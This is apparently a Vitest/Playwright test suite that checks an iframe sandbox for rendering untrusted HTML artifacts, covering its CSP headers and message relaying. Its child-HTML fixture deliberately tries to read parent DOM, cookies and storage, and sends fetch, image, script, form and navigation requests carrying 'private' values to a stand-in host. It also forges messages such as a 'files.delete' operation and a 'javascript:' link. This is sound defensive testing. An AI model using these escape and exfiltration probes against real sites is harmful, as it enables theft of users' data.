import {randomUUID} from 'node:crypto';
import type {Request,Response} from 'express';
import {chromium,webkit,type Browser,type Frame,type Page} from '@playwright/test';
import {expect,it} from 'vitest';
import {ARTIFACT_FRAME_CSP,ARTIFACT_FRAME_MAX_BYTES,buildArtifactFrameDocument,sendArtifactFrame} from '../server/artifactFrame';

const origin='https://artifact-app.invalid';
type PresentationEvent={source:string;channel:string;type:string;[key:string]:unknown};
function response(){const value={headers:{} as Record<string,string>,body:'',set(headers:Record<string,string>){Object.assign(this.headers,headers);return this;},send(body:string){this.body=body;return this;}};return value;}
it('serves an anonymous generic no-store shell without account data and with a restrictive independent HTTP policy',()=>{
 const res=response(),req={originalUrl:'/api/artifacts/frame?private-marker=ignored'} as Request;
 sendArtifactFrame(req,res as unknown as Response);
 expect(res.headers['Content-Security-Policy']).toBe(ARTIFACT_FRAME_CSP);
 for(const directive of ['sandbox allow-scripts',"default-src 'none'","script-src 'unsafe-inline'","connect-src 'none'","worker-src 'none'",'frame-src blob:',"frame-ancestors 'self'","base-uri 'none'","form-action 'none'"])expect(ARTIFACT_FRAME_CSP).toContain(directive);
 expect(ARTIFACT_FRAME_CSP).not.toMatch(/allow-same-origin|unsafe-eval|https?:/);
 expect(res.headers).toMatchObject({'Cache-Control':'private, no-store, max-age=0','Referrer-Policy':'no-referrer','X-Frame-Options':'SAMEORIGIN','X-Content-Type-Options':'nosniff','X-Robots-Tag':'noindex, nofollow'});
 expect(res.body).toBe(buildArtifactFrameDocument());expect(res.body).not.toContain('private-marker');expect(res.body).not.toContain('owner');
 const authenticated=response();sendArtifactFrame({actor:{userId:'private-owner',source:'external',scope:'read'}} as Request,authenticated as unknown as Response);
 expect(authenticated.body).toBe(res.body);expect(authenticated.body).not.toContain('private-owner');
});

async function fixture(browser:Browser){
 const context=await browser.newContext(),page=await context.newPage(),unexpected:string[]=[],diagnostics:string[]=[];
 page.on('console',message=>{if(message.type()==='error')diagnostics.push(message.text());});page.on('pageerror',error=>diagnostics.push(error.message));
 await page.route('**/*',async route=>{
  const url=route.request().url();
  if(url.startsWith('blob:')||url.startsWith('data:'))return route.continue();
  if(url===`${origin}/`)return route.fulfill({contentType:'text/html',headers:{'Content-Security-Policy':"default-src 'none'; script-src 'self'; frame-src 'self'"},body:'<!doctype html><iframe id="shell" src="/api/artifacts/frame" sandbox="allow-scripts"></iframe><script src="/host.js"></script>'});
  if(url===`${origin}/host.js`)return route.fulfill({contentType:'text/javascript',body:"window.appSecret='private-app-value';document.cookie='app-secret=private';window.artifactEvents=[];window.addEventListener('message',event=>{if(event.source===document.getElementById('shell').contentWindow)window.artifactEvents.push(event.data);});"});
  if(url===`${origin}/api/artifacts/frame`)return route.fulfill({contentType:'text/html',headers:{'Content-Security-Policy':ARTIFACT_FRAME_CSP,'Referrer-Policy':'no-referrer','X-Frame-Options':'SAMEORIGIN'},body:buildArtifactFrameDocument()});
  if(!url.endsWith('/favicon.ico'))unexpected.push(url);
  return route.fulfill({status:200,contentType:'text/html',body:'Unexpected network destination'});
 });
 await page.goto(origin);
 const outer=await page.locator('#shell').elementHandle().then(handle=>handle!.contentFrame());
 if(!outer)throw Error('Frame shell did not load.');
 return {context,page,outer,unexpected,diagnostics};
}
async function events(page:Page){return page.evaluate(()=>(window as unknown as {artifactEvents:PresentationEvent[]}).artifactEvents);}
async function host(page:Page,message:Record<string,unknown>){await page.evaluate(message=>document.querySelector<HTMLIFrameElement>('#shell')!.contentWindow!.postMessage({source:'newdrugs-artifact-host',...message},'*'),message);}
function childHtml(channel:string){return `<!doctype html><meta charset="utf-8"><button id="counter">0</button><input id="field"><script>
(()=>{const channel=${JSON.stringify(channel)},send=(type,detail={})=>parent.postMessage({source:'newdrugs-artifact-document',channel,type,...detail},'*');
window.probe={loaded:true,count:0,contexts:[]};
document.getElementById('counter').onclick=()=>{window.probe.count++;document.getElementById('counter').textContent=String(window.probe.count);};
window.addEventListener('message',event=>{if(event.source===parent&&event.data?.source==='newdrugs-artifact-frame'&&event.data.channel===channel&&event.data.type==='context')window.probe.contexts.push(event.data.context);});
window.sendPresentation=send;send('ready');
(async()=>{
 const blocked=read=>{try{read();return false;}catch{return true;}};
 let cookies=true;try{cookies=!document.cookie.includes('app-secret=private');document.cookie='artifact-cookie=forbidden; Path=/';}catch{}
 const guards={parentDom:blocked(()=>parent.document),appDom:blocked(()=>top.document),cookies,storage:blocked(()=>localStorage.getItem('app-secret')),eval:blocked(()=>new Function('return 1')()),fetch:false,worker:false};
 try{await fetch('https://outbound.invalid/fetch?private=value');}catch{guards.fetch=true;}
 guards.worker=await new Promise(resolve=>{const url=URL.createObjectURL(new Blob(['postMessage("worker")'],{type:'text/javascript'}));let worker;const timer=setTimeout(()=>done(false),1000);function done(value){clearTimeout(timer);worker?.terminate();URL.revokeObjectURL(url);resolve(value);}try{worker=new Worker(url);worker.onmessage=()=>done(false);worker.onerror=event=>{event.preventDefault();done(true);};}catch{done(true);}});
 const image=new Image();image.src='https://outbound.invalid/image?private=value';document.body.appendChild(image);
 const script=document.createElement('script');script.src='https://outbound.invalid/script?private=value';document.body.appendChild(script);
 const child=document.createElement('iframe');child.src='https://outbound.invalid/nested-frame?private=value';document.body.appendChild(child);
 const form=document.createElement('form');form.action='https://outbound.invalid/form';form.method='post';document.body.appendChild(form);form.submit();
 try{window.open('https://outbound.invalid/popup');}catch{}
 try{parent.location.href='https://outbound.invalid/parent-navigation?private=value';}catch{}
 try{top.location.href='https://outbound.invalid/top-navigation?private=value';}catch{}
 window.probe.guards=guards;
})();})();
</script>`;}
async function rendered(page:Page,outer:Frame,channel:string,diagnostics:string[]=[]){
 await host(page,{type:'render',channel,html:childHtml(channel),context:{appearance:'light',display:'inline'}});
 try{await expect.poll(async()=>(await events(page)).some(event=>event.type==='ready'&&event.channel===channel),{timeout:10000}).toBe(true);}catch{const states=await Promise.all(page.frames().map(async frame=>({url:frame.url(),state:await frame.evaluate(()=>({ready:document.readyState,probe:typeof(window as unknown as {probe?:unknown}).probe,body:document.body?.innerHTML.slice(0,1500)})).catch(()=>null)})));throw Error(`Artifact child failed: ${JSON.stringify({states,events:await events(page),diagnostics})}`);}
 const child=outer.childFrames()[0];if(!child)throw Error('Generated child did not load.');
 expect(child.url()).toBe('about:srcdoc');await child.waitForFunction(()=>Boolean((window as unknown as {probe?:unknown}).probe));return child;
}

for(const [name,engine] of [['Chromium',chromium],['WebKit',webkit]] as const){
 it(`${name}: executes opaque child HTML and relays only bounded presentation messages without rebuilding for context`,async()=>{
  const browser=await engine.launch({headless:true});
  try{
   const {page,outer,unexpected,diagnostics}=await fixture(browser),channel=randomUUID(),child=await rendered(page,outer,channel,diagnostics),url=child.url();
   expect(await outer.evaluate(()=>[document.documentElement,document.body,document.querySelector('iframe')!].map(element=>getComputedStyle(element).backgroundColor))).toEqual(['rgb(0, 0, 0)','rgb(0, 0, 0)','rgb(0, 0, 0)']);
   await child.locator('#counter').click();
   await host(page,{type:'context',channel,context:{appearance:'dark',display:'expanded',font:'serif'}});
   await expect.poll(()=>child.evaluate(()=>(window as unknown as {probe:{contexts:unknown[]}}).probe.contexts.at(-1))).toEqual({appearance:'dark',display:'expanded',font:'serif'});
   expect(await outer.evaluate(()=>[document.documentElement,document.body,document.querySelector('iframe')!].map(element=>getComputedStyle(element).backgroundColor))).toEqual(['rgb(28, 27, 27)','rgb(28, 27, 27)','rgb(28, 27, 27)']);
   await host(page,{type:'render',channel,html:childHtml(channel)});
   expect(child.url()).toBe(url);expect(await child.locator('#counter').textContent()).toBe('1');
   const before=(await events(page)).length;
   await page.evaluate(channel=>document.querySelector<HTMLIFrameElement>('#shell')!.contentWindow!.postMessage({source:'newdrugs-artifact-document',channel,type:'error',message:'wrong sender'},'*'),channel);
   await child.evaluate(({channel})=>{
    const send=(value:Record<string,unknown>)=>parent.postMessage({source:'newdrugs-artifact-document',channel,...value},'*');
    send({type:'execute',operation:'files.delete',input:{fileId:'private'}});send({type:'error',channel:'wrong-channel',message:'wrong channel'});
    send({type:'editable-focus',active:'not-a-boolean'});send({type:'resize',height:Infinity});send({type:'resize',height:20001});send({type:'link',href:'javascript:alert(1)'});
    parent.postMessage({source:'newdrugs-artifact-host',type:'render',channel,html:'<p>takeover</p>'},'*');
    send({type:'editable-focus',active:true,privateData:'never-forward'});send({type:'resize',height:123.2,privateData:'never-forward'});send({type:'escape',privateData:'never-forward'});send({type:'link',href:'/posts/example',privateData:'never-forward'});send({type:'link',href:'https://outbound.invalid/request-only',privateData:'never-forward'});send({type:'error',message:'x'.repeat(500),privateData:'never-forward'});
   },{channel});
   await expect.poll(async()=>(await events(page)).length).toBe(before+6);
   const relayed=(await events(page)).slice(before);
   expect(relayed).toEqual([
    {source:'newdrugs-artifact-frame',channel,type:'editable-focus',active:true},
    {source:'newdrugs-artifact-frame',channel,type:'resize',height:124},
    {source:'newdrugs-artifact-frame',channel,type:'escape'},
    {source:'newdrugs-artifact-frame',channel,type:'link',href:'/posts/example'},
    {source:'newdrugs-artifact-frame',channel,type:'link',href:'https://outbound.invalid/request-only'},
    {source:'newdrugs-artifact-frame',channel,type:'error',message:'x'.repeat(300)},
   ]);
   await host(page,{type:'context',channel,context:{appearance:'light',command:'delete'}});
   expect(await child.evaluate(()=>(window as unknown as {probe:{contexts:unknown[]}}).probe.contexts.at(-1))).toEqual({appearance:'dark',display:'expanded',font:'serif'});
   await host(page,{type:'render',channel:randomUUID(),html:'é'.repeat(ARTIFACT_FRAME_MAX_BYTES/2+1)});
   await expect.poll(async()=>(await events(page)).at(-1)?.type).toBe('error');
   expect(child.url()).toBe(url);expect(await child.locator('#counter').textContent()).toBe('1');expect(unexpected).toEqual([]);
  }finally{await browser.close();}
 },60000);

 it(`${name}: blocks child HTTP navigation, network APIs, external resources and app-origin access`,async()=>{
  const browser=await engine.launch({headless:true});
  try{
   const {page,outer,unexpected,diagnostics}=await fixture(browser),channel=randomUUID(),child=await rendered(page,outer,channel,diagnostics),url=child.url();
   await child.waitForFunction(()=>Boolean((window as unknown as {probe:{guards?:unknown}}).probe.guards));
   const guards=await child.evaluate(()=>(window as unknown as {probe:{guards:unknown}}).probe.guards);
   expect(guards).toEqual({parentDom:true,appDom:true,cookies:true,storage:true,eval:true,fetch:true,worker:true});
   const cookies=await page.evaluate(()=>document.cookie);expect(cookies).toContain('app-secret=private');expect(cookies).not.toContain('artifact-cookie=forbidden');
   await child.evaluate(()=>{location.href='https://outbound.invalid/navigation?private=value';});
   await page.waitForTimeout(100);
   expect(unexpected).toEqual([]);expect(page.url()).toBe(`${origin}/`);
   // A rejected navigation may replace the child with a browser error document.
   const next=await rendered(page,outer,randomUUID(),diagnostics);
   await next.evaluate(appOrigin=>{location.href=`${appOrigin}/same-origin-navigation?private=value`;},origin);
   await page.waitForTimeout(100);
   expect(unexpected).toEqual([]);expect(page.url()).toBe(`${origin}/`);expect(page.context().pages()).toHaveLength(1);
  }finally{await browser.close();}
 },60000);

 it(`${name}: rejects cross-origin embedding before the shell can initialize`,async()=>{
  const browser=await engine.launch({headless:true});
  try{
   const page=await browser.newPage(),foreign='https://foreign-frame.invalid';
   await page.route('**/*',async route=>{
    const url=route.request().url();
    if(url===`${foreign}/`)return route.fulfill({contentType:'text/html',body:`<!doctype html><iframe id="shell" src="${origin}/api/artifacts/frame"></iframe><script>window.artifactEvents=[];addEventListener('message',event=>window.artifactEvents.push(event.data));</script>`});
    return route.fulfill({contentType:'text/html',headers:{'Content-Security-Policy':ARTIFACT_FRAME_CSP,'X-Frame-Options':'SAMEORIGIN'},body:buildArtifactFrameDocument()});
   });
   await page.goto(foreign);
   await host(page,{type:'render',channel:randomUUID(),html:'<script>parent.postMessage({source:"newdrugs-artifact-document",type:"ready"},"*")</script>'});
   await page.waitForTimeout(100);
   expect(await events(page)).toEqual([]);
   const shell=page.frames().find(frame=>frame!==page.mainFrame());
   if(shell)expect(await shell.content()).not.toContain('newdrugs-artifact-host');
  }finally{await browser.close();}
 },60000);
}
